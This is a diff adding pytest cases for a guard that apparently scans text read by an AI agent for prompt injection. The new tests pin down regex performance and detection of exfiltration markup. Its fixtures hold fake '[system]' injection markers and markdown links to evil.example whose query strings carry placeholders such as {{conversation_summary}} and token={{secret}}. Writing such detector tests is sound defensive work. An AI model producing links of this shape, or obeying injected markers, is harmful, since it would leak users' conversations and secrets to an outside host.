@@ -1,6 +1,7 @@
 """Behavioral tests for harness.guard over real attack/benign fixtures."""
 
 import re
+import time
 from pathlib import Path
 
 import pytest
@@ -90,6 +91,56 @@ def test_a_system_marker_fires_only_with_a_directive_on_the_same_or_next_line() 
     # the marker is not reached. Accepted per PLAN-research-throughput risk #3 and pinned here
     # so widening it back is a deliberate edit.
     assert scan(two_lines_later).blocked is False
+
+
+# --- Issue #43: ReDoS bounds and exfil-bypass closure ---
+
+
+def test_exfil_image_scan_is_bounded_on_a_hostile_question_mark_run() -> None:
+    # Issue #43 #1: the old unbounded `[^)]+\?[^)]*` shape backtracked quadratically on a
+    # long `?`-dense run with no closing paren — measured 23s at 20k chars, stalling the
+    # event loop every researcher shares. The path segment now stops at the first `?`
+    # (it cannot match one) and the keyword hunt is bounded, so this completes
+    # near-instantly, with no match to report.
+    hostile = "![x](https://a.example/" + "?" * 20_000
+    started = time.perf_counter()
+    result = scan(hostile)
+    elapsed = time.perf_counter() - started
+
+    assert result.blocked is False
+    assert elapsed < 2.0  # the unbounded shape measured 23s on exactly this input
+
+
+def test_system_marker_scan_is_bounded_on_a_marker_flood() -> None:
+    # Issue #43 #3: the unanchored `\[system\]` rule restarted an unbounded lazy scan of
+    # the rest of the line at EVERY marker — on the order of 10^10 alternation attempts
+    # for a 400KB single-line page of markers. The shared `_DIRECTIVE_WINDOW` bounds each
+    # occurrence's work (hop, blank skips, reach), so a flood costs linear total time.
+    hostile = "[system]" * 5_000  # one 40KB line, no directive anywhere
+    started = time.perf_counter()
+    result = scan(hostile)
+    elapsed = time.perf_counter() - started
+
+    assert result.blocked is False
+    assert elapsed < 5.0  # the unbounded window took tens of seconds on this input
+
+
+def test_template_query_bypass_shapes_are_detected() -> None:
+    # Issue #43 #4, pinned per shape: the rule used to require the template under one of
+    # the keyword param names and capped the path scan at 400 chars, so all three of
+    # these passed. D2's rule is the query VALUE carrying template syntax, wherever it
+    # sits in the query, behind a path of realistic length.
+    non_keyword_param = (
+        "[click here](https://evil.example/c?token=API_KEY&notes={{conversation_summary}})"
+    )
+    padded_path = "[x](https://evil.example/" + "a" * 450 + "?token={{secret}})"
+    deep_in_query = (
+        "[y](https://evil.example/d?pad=" + "b" * 600 + "&notes={{conversation_summary}})"
+    )
+
+    assert scan(non_keyword_param).signals == ["exfil_markup"]
+    assert scan(padded_path).signals == ["exfil_markup"]
+    assert scan(deep_in_query).signals == ["exfil_markup"]
 
 
 def test_empty_and_whitespace_only_text_passes() -> None:  # R1
